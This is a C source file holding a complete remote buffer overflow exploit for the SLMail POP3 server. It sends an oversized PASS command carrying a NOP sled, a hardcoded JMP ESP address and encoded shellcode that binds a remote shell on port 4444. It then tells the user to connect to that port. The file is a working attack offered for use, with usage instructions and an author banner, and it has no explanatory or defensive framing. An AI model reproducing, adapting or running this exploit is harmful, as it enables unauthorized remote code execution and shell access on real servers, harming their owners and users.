/*
SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
*/

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

// [*] bind 4444
unsigned char shellcode[] =
"\xda\xcc\xd9\x74\x24\xf4\x58\x33\xc9\xba\x0e\x3a\x06\x1a\xb1"
"\x53\x83\xc0\x04\x31\x50\x13\x03\x5e\x29\xe4\xef\xa2\xa5\x6a"
"\x0f\x5a\x36\x0b\x99\xbf\x07\x0b\xfd\xb4\x38\xbb\x75\x98\xb4"
"\x30\xdb\x08\x4e\x34\xf4\x3f\xe7\xf3\x22\x0e\xf8\xa8\x17\x11"
"\x7a\xb3\x4b\xf1\x43\x7c\x9e\xf0\x84\x61\x53\xa0\x5d\xed\xc6"
"\x54\xe9\xbb\xda\xdf\xa1\x2a\x5b\x3c\x71\x4c\x4a\x93\x09\x17"
"\x4c\x12\xdd\x23\xc5\x0c\x02\x09\x9f\xa7\xf0\xe5\x1e\x61\xc9"
"\x06\x8c\x4c\xe5\xf4\xcc\x89\xc2\xe6\xba\xe3\x30\x9a\xbc\x30"
"\x4a\x40\x48\xa2\xec\x03\xea\x0e\x0c\xc7\x6d\xc5\x02\xac\xfa"
"\x81\x06\x33\x2e\xba\x33\xb8\xd1\x6c\xb2\xfa\xf5\xa8\x9e\x59"
"\x97\xe9\x7a\x0f\xa8\xe9\x24\xf0\x0c\x62\xc8\xe5\x3c\x29\x85"
"\xca\x0c\xd1\x55\x45\x06\xa2\x67\xca\xbc\x2c\xc4\x83\x1a\xab"
"\x2b\xbe\xdb\x23\xd2\x41\x1c\x6a\x11\x15\x4c\x04\xb0\x16\x07"
"\xd4\x3d\xc3\xb2\xdc\x98\xbc\xa0\x21\x5a\x6d\x65\x89\x33\x67"
"\x6a\xf6\x24\x88\xa0\x9f\xcd\x75\x4b\x8e\x51\xf3\xad\xda\x79"
"\x55\x65\x72\xb8\x82\xbe\xe5\xc3\xe0\x96\x81\x8c\xe2\x21\xae"
"\x0c\x21\x06\x38\x87\x26\x92\x59\x98\x62\xb2\x0e\x0f\xf8\x53"
"\x7d\xb1\xfd\x79\x15\x52\x6f\xe6\xe5\x1d\x8c\xb1\xb2\x4a\x62"
"\xc8\x56\x67\xdd\x62\x44\x7a\xbb\x4d\xcc\xa1\x78\x53\xcd\x24"
"\xc4\x77\xdd\xf0\xc5\x33\x89\xac\x93\xed\x67\x0b\x4a\x5c\xd1"
"\xc5\x21\x36\xb5\x90\x09\x89\xc3\x9c\x47\x7f\x2b\x2c\x3e\xc6"
"\x54\x81\xd6\xce\x2d\xff\x46\x30\xe4\xbb\x77\x7b\xa4\xea\x1f"
"\x22\x3d\xaf\x7d\xd5\xe8\xec\x7b\x56\x18\x8d\x7f\x46\x69\x88"
"\xc4\xc0\x82\xe0\x55\xa5\xa4\x57\x55\xec";

void exploit(int sock) {
      FILE *test;
      int *ptr;
      char userbuf[] = "USER madivan\r\n";
      char evil[2606];
      char buf[3046];
      char receive[1024];
      char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90"
                       "\x90\x90\x90\x90\x90\x90\x90\x90";
      memset(buf, 0x00, 3046);
      memset(evil, 0x00, 2606);
      memset(evil, 0x43, 2606); //was 3000
      ptr = &evil;
      ptr = ptr + 652; // 2608
      memcpy(ptr, &nopsled, 16);
      ptr = ptr + 4;
      memcpy(ptr, &shellcode, 355); //was 317
      *(long*)&evil[2600] = 0x5F4A358F; // JMP ESP XP 7CB41020 FFE4 JMP ESP "\x8f\x35\x4a\x5f"

      // banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // user
      printf("[+] Sending Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // passwd
      printf("[+] Sending Evil buffer...\n");
      sprintf(buf, "PASS %s\r\n", evil);
      //test = fopen("test.txt", "w");
      //fprintf(test, "%s", buf);
      //fclose(test);
      send(sock, buf, strlen(buf), 0);
      printf("[*] Done! Connect to the host on port 4444...\n\n");
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}
